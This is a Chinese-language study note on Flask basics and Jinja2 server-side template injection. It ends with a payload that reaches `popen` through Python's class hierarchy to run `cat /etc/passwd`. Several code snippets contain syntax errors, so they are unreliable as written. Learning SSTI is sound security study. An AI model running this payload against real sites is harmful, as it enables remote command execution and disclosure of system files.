# ,python venv环境安装

`cd /opt/flask1`

`source ./bin/activate`

#运行完发现命令行前面多了个(flask)

`deactivate`          #退出虚拟环境

# flask

flask是一个使用python编写的轻量级Web应用框架

模板引擎使用Jinja2

`vim demo.py`       内容如下

```
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
	return "hello,ggbo"
	
if __name__='__main__':
	app.run()
```

`app = Flask(__name__)`是获取名字,内部运行时name==main,外部运行时name等于python文件的文件名

`if __name__='__main__':
	app.run()`

就是只有内部运行时才会执行

`python3 demo.py`

只能在虚拟机中内部访问

把最后一行代码改为

`app.run(host='0.0.0.0')`

可以在物理主机上也访问

如果改为:

`app.run(debug=True,host='0.0.0.0')`

#调试程序的时候可以用,当配置修改的时候,会重启服务,成熟的产品不可以用它

也可以在app.run()中加port=来指定端口,但是换端口之后debug无法自动更改端口,需要重启服务



# flask变量及方法

demo.py

```
from flask import Flask
app = Flask(__name__)

@app.route('/aaa/<name>')
def hello(name):
	return "hello,%s" % name
	
if __name__='__main__':
	app.run()
```

`<name>`表示传入的参数,访问url是加上/aaa/ggbo就会显示

hello,ggbo

```
from flask import Flask
app = Flask(__name__)

@app.route('/aaa/<name>')
def hello(name):
	return "hello,%s" % name

@app.route('/int/<int:postID>')
def id(postID)
	return " %d " % postID
	
if __name__='__main__':
	app.run()
```

只接受整型的常量

## Flask HTTP方法

示例代码:

```
@app.route('/login',methods = ['POST','GET'])
def login():
	if request.method == 'POST':
		print(1)
		user = request.form['ben']
		return redirect(url_for('success',name = user))         #redirect重定向到/success/user
	else:
		print(2)
		user = request.args.get('ben')
		return redirect(url_for('success',name = user))
```



# Flask模板

## 视图函数

主要作用:生成请求的响应

处理业务逻辑>>>返回相应内容

把业务逻辑和表现内容放在一起,会增加代码复杂度和维护成本



**使用模板:**使用静态的页面html展示动态的内容(运算和数据分开)

模板是一个相应文本的文件,其中占用符(变量)表示动态部分,告诉模板引擎器具体的值需要从数据中获取

使用真实值替换白能量,在返回最终得到的字符串,这个过程称为**"渲染"**

Flask使用Jinja2模板引擎来进行渲染



## render_template

加载html文件,默认文件路径在templates下

![image-20240416234353046](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240416234353046.png)

## render_template_string

用于渲染html字符串,直接定义内容

![image-20240416234416626](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240416234416626.png)



# 模板注入漏洞

## Flask漏洞

成因:

渲染模板时,没有严格控制对用户的输入

可能造成任意文件读取和RCE远程控制后台系统

 ![image-20240417170044693](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417170044693.png)



![image-20240417170219297](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417170219297.png)



## SSTI

![image-20240417170348678](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417170348678.png)



# 继承关系和魔术方法

![image-20240417171115920](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417171115920.png)

![image-20240417171831466](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240417171831466.png)

也可以使用:

`print(c.__class__.__mro__)`   #直接显示上面的所有类

`print(c.__class__.__mro__[1].__subclasses__())`

#找到B类下面的所有类(数组形式)

`print(c.__class__.__mro__[1].__subclasses__()[1])`

#调用D



## 魔术方法

`__class_`:查找当前类型的所属对象

`__base__`:沿着父子类往上找一个类

`__mro__`:查找当前类上面的所有类

`__subclasses__()`:查找所有子类

`__init__`:查看类是否重载

`__globals__`:函数会以字典的形式返回当前对象的全部全局变量

`{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()}}`